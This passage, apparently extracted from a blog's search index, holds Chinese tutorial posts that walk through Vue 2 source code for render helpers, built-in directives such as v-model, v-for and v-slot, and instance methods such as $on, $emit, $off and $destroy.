当组件发生更新操作或者卸载的时候会触发这些生命周期beforeUpdate, updated, beforeDestory, destoryed renderMixin在这个函数中 首先通过 installRenderHelpers 方法在 Vue 实例上注册了 协助渲染的函数 12345678910111213141516171819function installRenderHelpers (target) &#123; target._o = markOnce; // 定义静态节点 只渲染一次, v-once 指令 target._n = toNumber; // 转化为整型 target._s = toString; // 字符串转化 target._l = renderList; // 渲染 v-for 循环 target._t = renderSlot; // 渲染 slot target._q = looseEqual; // 判断 对象是否相等 target._i = looseIndexOf; // 获取 元素 在 数组中的位置 target._m = renderStatic; // 定义静态节点 只渲染一次, v-once 指令 target._f = resolveFilter; // 调用 filter 方法 target._k = checkKeyCodes; // 检查键盘事件 target._b = bindObjectProps; // 读取 元素的 attr 属性绑定到 props 上面 target._v = createTextVNode; // 创建 文本node 节点 target._e = createEmptyVNode; // 创建空节点 target._u = resolveScopedSlots; // 渲染 ScopedSlot target._g = bindObjectListeners; // 绑定事件函数到 on 方法上去 target._d = bindDynamicKeys; // 渲染传入 变量 的 attrs 属性 target._p = prependModifier; // 设置前置修饰符&#125; 然后初始化 $nextTick _render 解析 dom 元素并渲染(patch)Vue 再渲染 DOM 的时候即 mountComponent 方法中 会调用 _update 方法，并将 Vue 的 _render 函数的返回值 (一个 VNode 对象) 作为参数传入,第二个参数 hydrating 为 undefined 然后在 _update 方法中 通过 __patch__ 即 patch/createPatchFunction 方法渲染页面 我们来看一下 patch 方法做了哪些东西 12// vm.$el, vnodevar patch = createPatchFunction(&#123; nodeOps: nodeOps, modules: modules &#125;) 首先创造了 几个生命周期1var hooks = [&#x27;create&#x27;, &#x27;activate&#x27;, &#x27;update&#x27;, &#x27;remove&#x27;, &#x27;destroy&#x27;];","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (八) - 指令","date":"2021-02-01T09:29:54.000Z","path":"2021/02/01/vue-learn-api-with-源码-08/","text":"内置指令Vue 内置了以下几种指令 v-text v-html v-show v-if v-else v-else-if v-for v-on v-bind v-model v-slot v-pre v-cloak v-once 在源码中分为以下几种 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// v-html v-text v-modelvar directives$1 = &#123; model: model, text: text, html: html&#125;// v-on v-bind v-clockvar baseDirectives = &#123; on: on, bind: bind$1, cloak: noop&#125;;// v-if v-else v-else-iffunction processIf (el) &#123; var exp = getAndRemoveAttr(el, &#x27;v-if&#x27;); if (exp) &#123; el.if = exp; addIfCondition(el, &#123; exp: exp, block: el &#125;); &#125; else &#123; if (getAndRemoveAttr(el, &#x27;v-else&#x27;) != null) &#123; el.else = true; &#125; var elseif = getAndRemoveAttr(el, &#x27;v-else-if&#x27;); if (elseif) &#123; el.elseif = elseif; &#125; &#125;&#125;// v-prefunction processPre (el) &#123; if (getAndRemoveAttr(el, &#x27;v-pre&#x27;) != null) &#123; el.pre = true; &#125;&#125;// v-for v-slotfunction processFor (el) &#123; var exp; if ((exp = getAndRemoveAttr(el, &#x27;v-for&#x27;))) &#123; var res = parseFor(exp); if (res) &#123; extend(el, res); &#125; else &#123; warn$2( (&quot;Invalid v-for expression: &quot; + exp), el.rawAttrsMap[&#x27;v-for&#x27;] ); &#125; &#125;&#125;// v-slotvar slotBinding = getAndRemoveAttrByRegex(el, slotRE);// v-oncefunction processOnce (el) &#123; var once$$1 = getAndRemoveAttr(el, &#x27;v-once&#x27;); if (once$$1 != null) &#123; el.once = true; &#125;&#125;// v-showif (child.data.directives &amp;&amp; child.data.directives.some(isVShowDirective)) &#123; child.data.show = true;&#125; v-text / v-html123456789101112131415161718192021222324252627282930313233343536373839// dir 为 directive 中的 binding 属性/** arg: null end: 18 isDynamicArg: false modifiers: undefined name: &quot;text&quot; rawName: &quot;v-text&quot; start: 5 value: &quot;text&quot;*/function text (el, dir) &#123; if (dir.value) &#123; addProp(el, &#x27;textContent&#x27;, (&quot;_s(&quot; + (dir.value) + &quot;)&quot;), dir); &#125;&#125;function html (el, dir) &#123; if (dir.value) &#123; addProp(el, &#x27;innerHTML&#x27;, (&quot;_s(&quot; + (dir.value) + &quot;)&quot;), dir); &#125;&#125;// addProp (当前元素实例, &#x27;textContent&#x27;, &#x27;_s(dir.value)&#x27;, dir, null)function addProp (el, name, value, range, dynamic) &#123; (el.props || (el.props = [])).push(rangeSetItem(&#123; name: name, value: value, dynamic: dynamic &#125;, range)); el.plain = false;&#125;// rangeSetItemfunction rangeSetItem (item, range) &#123; if (range) &#123; if (range.start != null) &#123; item.start = range.start; &#125; if (range.end != null) &#123; item.end = range.end; &#125; &#125; return item&#125; v-text 指令在 processAttrs 函数中 通过 addDirective 方法 添加一个 directive 属性，然后 通过 updateDOMProps 方法中的 elm[key] = cur 为 元素的 textContent 或者 innerHTML 属性赋值 12&lt;div v-text=&quot;text&quot;&gt;&lt;/div&gt;&lt;div v-html=&quot;text&quot;&gt;&lt;/div&gt; 注意：如果 v-text/v-html 指令所在的元素下的子元素，则不会被渲染 v-model123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function model (el, dir, _warn) &#123; warn$1 = _warn; var value = dir.value; var modifiers = dir.modifiers; var tag = el.tag; var type = el.attrsMap.type; &#123; // inputs with type=&quot;file&quot; are read only and setting the input&#x27;s // value will throw an error. if (tag === &#x27;input&#x27; &amp;&amp; type === &#x27;file&#x27;) &#123; warn$1( &quot;&lt;&quot; + (el.tag) + &quot; v-model=\\&quot;&quot; + value + &quot;\\&quot; type=\\&quot;file\\&quot;&gt;:\\n&quot; + &quot;File inputs are read only. Use a v-on:change listener instead.&quot;, el.rawAttrsMap[&#x27;v-model&#x27;] ); &#125; &#125; if (el.component) &#123; genComponentModel(el, value, modifiers); // component v-model doesn&#x27;t need extra runtime return false &#125; else if (tag === &#x27;select&#x27;) &#123; genSelect(el, value, modifiers); &#125; else if (tag === &#x27;input&#x27; &amp;&amp; type === &#x27;checkbox&#x27;) &#123; genCheckboxModel(el, value, modifiers); &#125; else if (tag === &#x27;input&#x27; &amp;&amp; type === &#x27;radio&#x27;) &#123; genRadioModel(el, value, modifiers); &#125; else if (tag === &#x27;input&#x27; || tag === &#x27;textarea&#x27;) &#123; genDefaultModel(el, value, modifiers); &#125; else if (!config.isReservedTag(tag)) &#123; genComponentModel(el, value, modifiers); // component v-model doesn&#x27;t need extra runtime return false &#125; else &#123; warn$1( &quot;&lt;&quot; + (el.tag) + &quot; v-model=\\&quot;&quot; + value + &quot;\\&quot;&gt;: &quot; + &quot;v-model is not supported on this element type. &quot; + &#x27;If you are working with contenteditable, it\\&#x27;s recommended to &#x27; + &#x27;wrap a library dedicated for that purpose inside a custom component.&#x27;, el.rawAttrsMap[&#x27;v-model&#x27;] ); &#125; // ensure runtime directive metadata return true&#125; v-model 指令主要针对于 input 输入框 及textarea 等需要输入或者状态变更的元素，v-model 相当于 v-bind:value + v-on:change 的组合体，在其他组件上不能使用 v-model v-show123456789101112131415161718192021222324// ref// def: &#123;bind: ƒ, update: ƒ, unbind: ƒ&#125;// expression: &quot;true&quot;// modifiers: &#123;&#125;// name: &quot;show&quot;// rawName: &quot;v-show&quot;// value: truebind: function bind (el, ref, vnode) &#123; var value = ref.value; vnode = locateNode(vnode); var transition$$1 = vnode.data &amp;&amp; vnode.data.transition; var originalDisplay = el.__vOriginalDisplay = el.style.display === &#x27;none&#x27; ? &#x27;&#x27; : el.style.display; console.log(ref,value, transition$$1) if (value &amp;&amp; transition$$1) &#123; vnode.data.show = true; enter(vnode, function () &#123; el.style.display = originalDisplay; &#125;); &#125; else &#123; el.style.display = value ? originalDisplay : &#x27;none&#x27;; &#125;&#125;, 取 ref.value 如果 v-show=&quot;false&quot; 则 ref.value 为 false 将 元素的display 属性设置为 null v-if/v-else/v-else-if123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 判断当前元素是否有 v-if，v-else， v-else-if 指令// 并将元素上的if,else,elseif 属性置为对应状态function processIf (el) &#123; var exp = getAndRemoveAttr(el, &#x27;v-if&#x27;); if (exp) &#123; el.if = exp; addIfCondition(el, &#123; exp: exp, block: el &#125;); &#125; else &#123; if (getAndRemoveAttr(el, &#x27;v-else&#x27;) != null) &#123; el.else = true; &#125; var elseif = getAndRemoveAttr(el, &#x27;v-else-if&#x27;); if (elseif) &#123; el.elseif = elseif; &#125; &#125;&#125;// 通过 addIfCondition 方法将 v-if 所在的元素放入 ifConditions 数组中function addIfCondition (el, condition) &#123; if (!el.ifConditions) &#123; el.ifConditions = []; &#125; el.ifConditions.push(condition);&#125;// markStatic$1if (node.ifConditions) &#123; for (var i$1 = 1, l$1 = node.ifConditions.length; i$1 &lt; l$1; i$1++) &#123; var block = node.ifConditions[i$1].block; markStatic$1(block); if (!block.static) &#123; node.static = false; &#125; &#125;&#125;// genIfConditions 转换 IfConditions 中的元素function genIfConditions ( conditions, state, altGen, altEmpty) &#123; if (!conditions.length) &#123; return altEmpty || &#x27;_e()&#x27; &#125; var condition = conditions.shift(); if (condition.exp) &#123; return (&quot;(&quot; + (condition.exp) + &quot;)?&quot; + (genTernaryExp(condition.block)) + &quot;:&quot; + (genIfConditions(conditions, state, altGen, altEmpty))) &#125; else &#123; return (&quot;&quot; + (genTernaryExp(condition.block))) &#125; // v-if with v-once should generate code like (a)?_m(0):_m(1) function genTernaryExp (el) &#123; return altGen ? altGen(el, state) : el.once ? genOnce(el, state) : genElement(el, state) &#125;&#125; v-for 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116// 判断是否含有 v-for 指令 然后通过 extend 方法将 parseFor 转出的参数扩展到 元素上function processFor (el) &#123; var exp; if ((exp = getAndRemoveAttr(el, &#x27;v-for&#x27;))) &#123; var res = parseFor(exp); if (res) &#123; extend(el, res); &#125; else &#123; warn$2( (&quot;Invalid v-for expression: &quot; + exp), el.rawAttrsMap[&#x27;v-for&#x27;] ); &#125; &#125;&#125;// 判断 for 循环function parseFor (exp) &#123; // 正则表达式匹配，循环数组是否正确 [exp, item, 10] var inMatch = exp.match(forAliasRE); if (!inMatch) &#123; return &#125; var res = &#123;&#125;; res.for = inMatch[2].trim(); // 针对 v-for=&quot;(item,index) in array&quot; 进行处理 去除 item / item,index var alias = inMatch[1].trim().replace(stripParensRE, &#x27;&#x27;); // 针对(item,index) in array 去除 , index var iteratorMatch = alias.match(forIteratorRE); if (iteratorMatch) &#123; res.alias = alias.replace(forIteratorRE, &#x27;&#x27;).trim(); res.iterator1 = iteratorMatch[1].trim(); if (iteratorMatch[2]) &#123; res.iterator2 = iteratorMatch[2].trim(); &#125; &#125; else &#123; res.alias = alias; &#125; // alias 对象别名 可以通过 alias 访问遍历数组的元素 // iterator1 遍历时第二个参数 return res&#125;// genFor 获取与 v-for 指令相关参数，调用 renderList 方法渲染数组function genFor ( el, state, altGen, altHelper) &#123; var exp = el.for; var alias = el.alias; var iterator1 = el.iterator1 ? (&quot;,&quot; + (el.iterator1)) : &#x27;&#x27;; var iterator2 = el.iterator2 ? (&quot;,&quot; + (el.iterator2)) : &#x27;&#x27;; if (state.maybeComponent(el) &amp;&amp; el.tag !== &#x27;slot&#x27; &amp;&amp; el.tag !== &#x27;template&#x27; &amp;&amp; !el.key ) &#123; state.warn( &quot;&lt;&quot; + (el.tag) + &quot; v-for=\\&quot;&quot; + alias + &quot; in &quot; + exp + &quot;\\&quot;&gt;: component lists rendered with &quot; + &quot;v-for should have explicit keys. &quot; + &quot;See https://vuejs.org/guide/list.html#key for more info.&quot;, el.rawAttrsMap[&#x27;v-for&#x27;], true /* tip */ ); &#125; el.forProcessed = true; // avoid recursion // 调用 renderList 方法 传入渲染函数 return (altHelper || &#x27;_l&#x27;) + &quot;((&quot; + exp + &quot;),&quot; + &quot;function(&quot; + alias + iterator1 + iterator2 + &quot;)&#123;&quot; + &quot;return &quot; + ((altGen || genElement)(el, state)) + &#x27;&#125;)&#x27;&#125;// rederListfunction renderList ( val, render) &#123; var ret, i, l, keys, key; if (Array.isArray(val) || typeof val === &#x27;string&#x27;) &#123; ret = new Array(val.length); for (i = 0, l = val.length; i &lt; l; i++) &#123; ret[i] = render(val[i], i); &#125; &#125; else if (typeof val === &#x27;number&#x27;) &#123; ret = new Array(val); for (i = 0; i &lt; val; i++) &#123; ret[i] = render(i + 1, i); &#125; &#125; else if (isObject(val)) &#123; if (hasSymbol &amp;&amp; val[Symbol.iterator]) &#123; ret = []; // 利用 Symbol.iterator 方法 循环 对象val var iterator = val[Symbol.iterator](); var result = iterator.next(); while (!result.done) &#123; ret.push(render(result.value, ret.length)); result = iterator.next(); &#125; &#125; else &#123; keys = Object.keys(val); ret = new Array(keys.length); for (i = 0, l = keys.length; i &lt; l; i++) &#123; key = keys[i]; ret[i] = render(val[key], key, i); &#125; &#125; &#125; if (!isDef(ret)) &#123; ret = []; &#125; (ret)._isVList = true; return ret&#125; v-on 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980name = name.replace(onRE, &#x27;&#x27;);isDynamic = dynamicArgRE.test(name);if (isDynamic) &#123; name = name.slice(1, -1);&#125;addHandler(el, name, value, modifiers, false, warn$2, list[i], isDynamic);// addHandlerfunction addHandler (el,name,value,modifiers,important,warn,range,dynamic) &#123; modifiers = modifiers || emptyObject; // warn prevent and passive modifier /* istanbul ignore if */ if ( warn &amp;&amp; modifiers.prevent &amp;&amp; modifiers.passive ) &#123; warn( &#x27;passive and prevent can\\&#x27;t be used together. &#x27; + &#x27;Passive handler can\\&#x27;t prevent default event.&#x27;, range ); &#125; // normalize click.right and click.middle since they don&#x27;t actually fire // this is technically browser-specific, but at least for now browsers are // the only target envs that have right/middle clicks. if (modifiers.right) &#123; if (dynamic) &#123; name = &quot;(&quot; + name + &quot;)===&#x27;click&#x27;?&#x27;contextmenu&#x27;:(&quot; + name + &quot;)&quot;; &#125; else if (name === &#x27;click&#x27;) &#123; name = &#x27;contextmenu&#x27;; delete modifiers.right; &#125; &#125; else if (modifiers.middle) &#123; if (dynamic) &#123; name = &quot;(&quot; + name + &quot;)===&#x27;click&#x27;?&#x27;mouseup&#x27;:(&quot; + name + &quot;)&quot;; &#125; else if (name === &#x27;click&#x27;) &#123; name = &#x27;mouseup&#x27;; &#125; &#125; // check capture modifier if (modifiers.capture) &#123; delete modifiers.capture; name = prependModifierMarker(&#x27;!&#x27;, name, dynamic); &#125; if (modifiers.once) &#123; delete modifiers.once; name = prependModifierMarker(&#x27;~&#x27;, name, dynamic); &#125; /* istanbul ignore if */ if (modifiers.passive) &#123; delete modifiers.passive; name = prependModifierMarker(&#x27;&amp;&#x27;, name, dynamic); &#125; var events; if (modifiers.native) &#123; delete modifiers.native; events = el.nativeEvents || (el.nativeEvents = &#123;&#125;); &#125; else &#123; events = el.events || (el.events = &#123;&#125;); &#125; var newHandler = rangeSetItem(&#123; value: value.trim(), dynamic: dynamic &#125;, range); if (modifiers !== emptyObject) &#123; newHandler.modifiers = modifiers; &#125; var handlers = events[name]; /* istanbul ignore if */ if (Array.isArray(handlers)) &#123; important ? handlers.unshift(newHandler) : handlers.push(newHandler); &#125; else if (handlers) &#123; events[name] = important ? [newHandler, handlers] : [handlers, newHandler]; &#125; else &#123; events[name] = newHandler; &#125; el.plain = false;&#125; 修饰器 .stop 阻止默认事件 event.stopPropagation() .prevent 阻止默认事件 event.preventDefault() .capture 添加事件监听器使用 capture 模式 .self 只当事件从侦听器绑定的元素本身触发时才触发回调 .&#123;keyCode | keyAlias&#125; 只有特定键触发才会触发回调函数 .native 监听根元素的原生时间 .once 只触发一次回调 .left 点击鼠标左键触发 .right 点击鼠标右键触发 .middle 点击鼠标中键触发 .passive 以 &#123;passive: true&#125; 模式添加侦听器 v-bind 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566name = name.replace(bindRE, &#x27;&#x27;);value = parseFilters(value);isDynamic = dynamicArgRE.test(name);if (isDynamic) &#123; name = name.slice(1, -1);&#125;if ( value.trim().length === 0) &#123; warn$2( (&quot;The value for a v-bind expression cannot be empty. Found in \\&quot;v-bind:&quot; + name + &quot;\\&quot;&quot;) );&#125;if (modifiers) &#123; if (modifiers.prop &amp;&amp; !isDynamic) &#123; name = camelize(name); if (name === &#x27;innerHtml&#x27;) &#123; name = &#x27;innerHTML&#x27;; &#125; &#125; if (modifiers.camel &amp;&amp; !isDynamic) &#123; name = camelize(name); &#125; if (modifiers.sync) &#123; syncGen = genAssignmentCode(value, &quot;$event&quot;); if (!isDynamic) &#123; addHandler( el, (&quot;update:&quot; + (camelize(name))), syncGen, null, false, warn$2, list[i] ); if (hyphenate(name) !== camelize(name)) &#123; addHandler( el, (&quot;update:&quot; + (hyphenate(name))), syncGen, null, false, warn$2, list[i] ); &#125; &#125; else &#123; // handler w/ dynamic event name addHandler( el, (&quot;\\&quot;update:\\&quot;+(&quot; + name + &quot;)&quot;), syncGen, null, false, warn$2, list[i], true // dynamic ); &#125; &#125;&#125;if ((modifiers &amp;&amp; modifiers.prop) || ( !el.component &amp;&amp; platformMustUseProp(el.tag, el.attrsMap.type, name))) &#123; addProp(el, name, value, list[i], isDynamic);&#125; else &#123; addAttr(el, name, value, list[i], isDynamic);&#125; 修饰符 .prop 作为 DOM 的property绑定，而不是作为 attribute 绑定 。camel 将事件名转化为驼峰模式 .sync 会扩展一个更新父组件绑定值的 v-on 监听器 v-slot 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118function processSlotContent (el) &#123; var slotScope; if (el.tag === &#x27;template&#x27;) &#123; slotScope = getAndRemoveAttr(el, &#x27;scope&#x27;); /* istanbul ignore if */ if (slotScope) &#123; warn$2( &quot;the \\&quot;scope\\&quot; attribute for scoped slots have been deprecated and &quot; + &quot;replaced by \\&quot;slot-scope\\&quot; since 2.5. The new \\&quot;slot-scope\\&quot; attribute &quot; + &quot;can also be used on plain elements in addition to &lt;template&gt; to &quot; + &quot;denote scoped slots.&quot;, el.rawAttrsMap[&#x27;scope&#x27;], true ); &#125; el.slotScope = slotScope || getAndRemoveAttr(el, &#x27;slot-scope&#x27;); &#125; else if ((slotScope = getAndRemoveAttr(el, &#x27;slot-scope&#x27;))) &#123; /* istanbul ignore if */ if (el.attrsMap[&#x27;v-for&#x27;]) &#123; warn$2( &quot;Ambiguous combined usage of slot-scope and v-for on &lt;&quot; + (el.tag) + &quot;&gt; &quot; + &quot;(v-for takes higher priority). Use a wrapper &lt;template&gt; for the &quot; + &quot;scoped slot to make it clearer.&quot;, el.rawAttrsMap[&#x27;slot-scope&#x27;], true ); &#125; el.slotScope = slotScope; &#125; // slot=&quot;xxx&quot; var slotTarget = getBindingAttr(el, &#x27;slot&#x27;); if (slotTarget) &#123; el.slotTarget = slotTarget === &#x27;&quot;&quot;&#x27; ? &#x27;&quot;default&quot;&#x27; : slotTarget; el.slotTargetDynamic = !!(el.attrsMap[&#x27;:slot&#x27;] || el.attrsMap[&#x27;v-bind:slot&#x27;]); // preserve slot as an attribute for native shadow DOM compat // only for non-scoped slots. if (el.tag !== &#x27;template&#x27; &amp;&amp; !el.slotScope) &#123; addAttr(el, &#x27;slot&#x27;, slotTarget, getRawBindingAttr(el, &#x27;slot&#x27;)); &#125; &#125; // 2.6 v-slot syntax &#123; if (el.tag === &#x27;template&#x27;) &#123; // v-slot on &lt;template&gt; var slotBinding = getAndRemoveAttrByRegex(el, slotRE); if (slotBinding) &#123; &#123; if (el.slotTarget || el.slotScope) &#123; warn$2( &quot;Unexpected mixed usage of different slot syntaxes.&quot;, el ); &#125; if (el.parent &amp;&amp; !maybeComponent(el.parent)) &#123; warn$2( &quot;&lt;template v-slot&gt; can only appear at the root level inside &quot; + &quot;the receiving component&quot;, el ); &#125; &#125; var ref = getSlotName(slotBinding); var name = ref.name; var dynamic = ref.dynamic; el.slotTarget = name; el.slotTargetDynamic = dynamic; el.slotScope = slotBinding.value || emptySlotScopeToken; // force it into a scoped slot for perf &#125; &#125; else &#123; // v-slot on component, denotes default slot var slotBinding$1 = getAndRemoveAttrByRegex(el, slotRE); if (slotBinding$1) &#123; &#123; if (!maybeComponent(el)) &#123; warn$2( &quot;v-slot can only be used on components or &lt;template&gt;.&quot;, slotBinding$1 ); &#125; if (el.slotScope || el.slotTarget) &#123; warn$2( &quot;Unexpected mixed usage of different slot syntaxes.&quot;, el ); &#125; if (el.scopedSlots) &#123; warn$2( &quot;To avoid scope ambiguity, the default slot should also use &quot; + &quot;&lt;template&gt; syntax when there are other named slots.&quot;, slotBinding$1 ); &#125; &#125; // add the component&#x27;s children to its default slot var slots = el.scopedSlots || (el.scopedSlots = &#123;&#125;); var ref$1 = getSlotName(slotBinding$1); var name$1 = ref$1.name; var dynamic$1 = ref$1.dynamic; var slotContainer = slots[name$1] = createASTElement(&#x27;template&#x27;, [], el); slotContainer.slotTarget = name$1; slotContainer.slotTargetDynamic = dynamic$1; slotContainer.children = el.children.filter(function (c) &#123; if (!c.slotScope) &#123; c.parent = slotContainer; return true &#125; &#125;); slotContainer.slotScope = slotBinding$1.value || emptySlotScopeToken; // remove children as they are returned from scopedSlots now el.children = []; // mark el non-plain so data gets generated el.plain = false; &#125; &#125; &#125;&#125; v-pre 跳过这个元素和子元素的编译过程，显示原始的标签 v-cloak 无表达式，绑定一个空函数，隐藏未编译的 标签直到实例准备完成 v-once 123456789101112131415161718192021222324252627282930313233// 判断是否含有 v-once 指令function processOnce (el) &#123; var once$$1 = getAndRemoveAttr(el, &#x27;v-once&#x27;); if (once$$1 != null) &#123; el.once = true; &#125;&#125;// v-oncefunction genOnce (el, state) &#123; el.onceProcessed = true; if (el.if &amp;&amp; !el.ifProcessed) &#123; return genIf(el, state) &#125; else if (el.staticInFor) &#123; var key = &#x27;&#x27;; var parent = el.parent; while (parent) &#123; if (parent.for) &#123; key = parent.key; break &#125; parent = parent.parent; &#125; if (!key) &#123; state.warn( &quot;v-once can only be used inside v-for that is keyed. &quot;, el.rawAttrsMap[&#x27;v-once&#x27;] ); return genElement(el, state) &#125; return (&quot;_o(&quot; + (genElement(el, state)) + &quot;,&quot; + (state.onceId++) + &quot;,&quot; + key + &quot;)&quot;) &#125; else &#123; return genStatic(el, state) &#125;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (七) - 实例 property","date":"2021-02-01T07:25:46.000Z","path":"2021/02/01/vue-learn-api-with-源码-07/","text":"$on $emit监听 Vue.$emit 发送的事件，回调函数会接收所有传入参数的参数 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// $on 监听事件Vue.prototype.$on = function (event, fn) &#123; var vm = this; if (Array.isArray(event)) &#123; for (var i = 0, l = event.length; i &lt; l; i++) &#123; vm.$on(event[i], fn); &#125; &#125; else &#123; (vm._events[event] || (vm._events[event] = [])).push(fn); // optimize hook:event cost by using a boolean flag marked at registration // instead of a hash lookup if (hookRE.test(event)) &#123; vm._hasHookEvent = true; &#125; &#125; return vm&#125;;// $emit 发送事件及参数Vue.prototype.$emit = function (event) &#123; var vm = this; &#123; var lowerCaseEvent = event.toLowerCase(); if (lowerCaseEvent !== event &amp;&amp; vm._events[lowerCaseEvent]) &#123; tip( &quot;Event \\&quot;&quot; + lowerCaseEvent + &quot;\\&quot; is emitted in component &quot; + (formatComponentName(vm)) + &quot; but the handler is registered for \\&quot;&quot; + event + &quot;\\&quot;. &quot; + &quot;Note that HTML attributes are case-insensitive and you cannot use &quot; + &quot;v-on to listen to camelCase events when using in-DOM templates. &quot; + &quot;You should probably use \\&quot;&quot; + (hyphenate(event)) + &quot;\\&quot; instead of \\&quot;&quot; + event + &quot;\\&quot;.&quot; ); &#125; &#125; var cbs = vm._events[event]; if (cbs) &#123; cbs = cbs.length &gt; 1 ? toArray(cbs) : cbs; var args = toArray(arguments, 1); var info = &quot;event handler for \\&quot;&quot; + event + &quot;\\&quot;&quot;; for (var i = 0, l = cbs.length; i &lt; l; i++) &#123; // 调用 事件监听的回调函数 invokeWithErrorHandling(cbs[i], vm, args, vm, info); &#125; &#125; return vm&#125;;// invokeWithErrorHandlingfunction invokeWithErrorHandling ( handler, context, args, vm, info) &#123; var res; try &#123; res = args ? handler.apply(context, args) : handler.call(context); if (res &amp;&amp; !res._isVue &amp;&amp; isPromise(res) &amp;&amp; !res._handled) &#123; res.catch(function (e) &#123; return handleError(e, vm, info + &quot; (Promise/async)&quot;); &#125;); // issue #9511 // avoid catch triggering multiple times when nested calls res._handled = true; &#125; &#125; catch (e) &#123; handleError(e, vm, info); &#125; return res&#125; 主要是用了 事件发布订阅模式 (vm._events[event] || (vm._events[event] = [])).push(fn) 通过这段代码 将 $on 监听的事件名称及方法 存储到 Vue 的私有属性 _event 中，当使用 $emit 发送事件的时候会在 _event 中找到对应的时间名，然后调用 res = args ? handler.apply(context, args) : handler.call(context) 调用 回调函数 使用1234567// 发送事件this.$emit(&#x27;sayHi&#x27;, &#x27;hi&#x27;)// 接收事件this.$on(&#x27;sayHi&#x27;, function(msg) &#123; console.log(&#x27;say &#x27; + msg) // say hi&#125;) $once 监听一个自定义时间，只触发一次，触发之后移除监听器 12345678910Vue.prototype.$once = function (event, fn) &#123; var vm = this; function on () &#123; vm.$off(event, on); fn.apply(vm, arguments); &#125; on.fn = fn; vm.$on(event, on); return vm&#125;; 在 $once 函数内部定义了一个回调函数，用于 触发事件之后调用 $off 方法销毁事件监听器$emit 触发 $once 监听事件 $off 移除事件监听器 1234567891011121314151617181920212223242526272829303132333435Vue.prototype.$off = function (event, fn) &#123; var vm = this; // all if (!arguments.length) &#123; vm._events = Object.create(null); return vm &#125; // array of events if (Array.isArray(event)) &#123; for (var i$1 = 0, l = event.length; i$1 &lt; l; i$1++) &#123; vm.$off(event[i$1], fn); &#125; return vm &#125; // specific event var cbs = vm._events[event]; if (!cbs) &#123; return vm &#125; if (!fn) &#123; vm._events[event] = null; return vm &#125; // specific handler var cb; var i = cbs.length; while (i--) &#123; cb = cbs[i]; if (cb === fn || cb.fn === fn) &#123; cbs.splice(i, 1); break &#125; &#125; return vm&#125;; 使用 $off 方法移除监听器的时候可以选择性的传两个参数 event, fn 如果不传参数 默认移除所有的监听器事件 如果只传了 event 事件，移除对应事件下所有的监听器事件 如果同时提供了 event 事件和 回调，移除对应事件下的这个回调的监听器 使用123this.$off() // 移除所有this.$off(&#x27;test&#x27;) // 移除 test 下的所有监视器函数this.$off(&#x27;test&#x27;, fn) // 移除 test 下的 fn 回调函数 fn 是一个变量，指向回调函数地址 $mount 传入 el 为 DOM 元素 源码参考地址 使用123new Vue(&#123; render: (h) =&gt; h()&#125;).$mount(&#x27;#app&#x27;) $forceUpdate强制更新页面，仅影响实例本身和插入插槽内容的子组件 123456Vue.prototype.$forceUpdate = function () &#123; var vm = this; if (vm._watcher) &#123; vm._watcher.update(); &#125;&#125;; 原理是调用 Watcher 的 update 方法更新 DOM 元素 $nextTick Vue.nextTick $destroy源码123456789101112131415161718192021222324252627282930313233343536373839404142Vue.prototype.$destroy = function () &#123; var vm = this; if (vm._isBeingDestroyed) &#123; return &#125; callHook(vm, &#x27;beforeDestroy&#x27;); vm._isBeingDestroyed = true; // remove self from parent var parent = vm.$parent; if (parent &amp;&amp; !parent._isBeingDestroyed &amp;&amp; !vm.$options.abstract) &#123; remove(parent.$children, vm); &#125; // teardown watchers if (vm._watcher) &#123; vm._watcher.teardown(); &#125; var i = vm._watchers.length; while (i--) &#123; vm._watchers[i].teardown(); &#125; // remove reference from data ob // frozen object may not have observer. if (vm._data.__ob__) &#123; vm._data.__ob__.vmCount--; &#125; // call the last hook... vm._isDestroyed = true; // invoke destroy hooks on current rendered tree vm.__patch__(vm._vnode, null); // fire destroyed hook callHook(vm, &#x27;destroyed&#x27;); // turn off all instance listeners. vm.$off(); // remove __vue__ reference if (vm.$el) &#123; vm.$el.__vue__ = null; &#125; // release circular reference (#6759) if (vm.$vnode) &#123; vm.$vnode.parent = null; &#125;&#125;; 在 $destroy 函数执行过程中，触发了 beforeDestroy 和 destroyed 生命周期函数 为防止多次调用，添加了是否正在销毁组件状态 同时移除所有的子组件，监听函数 销毁所有的事件监听函数，并置空 node 节点","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (六) - 实例 property","date":"2021-01-29T06:34:56.000Z","path":"2021/01/29/vue-learn-api-with-源码-06/","text":"$data源码12dataDef.get = function () &#123; return this._data &#125;;Object.defineProperty(Vue.prototype, &#x27;$data&#x27;, dataDef); 通过 Object.defineProperty 方法对 Vue 原型上的 $data 设置监听方法，访问 $data 属性的时候 直接返回 Vue 的 _data 数据 不推介使用 $data 来访问 Vue 中 data 中的数据，因为 Vue 在内部已经做了映射，直接把 data 中的属性 映射到 Vue 实例上 $props源码12propsDef.get = function () &#123; return this._props &#125;;Object.defineProperty(Vue.prototype, &#x27;$props&#x27;, propsDef); 通过 Object.defineProperty 方法对 Vue 原型上的 $props 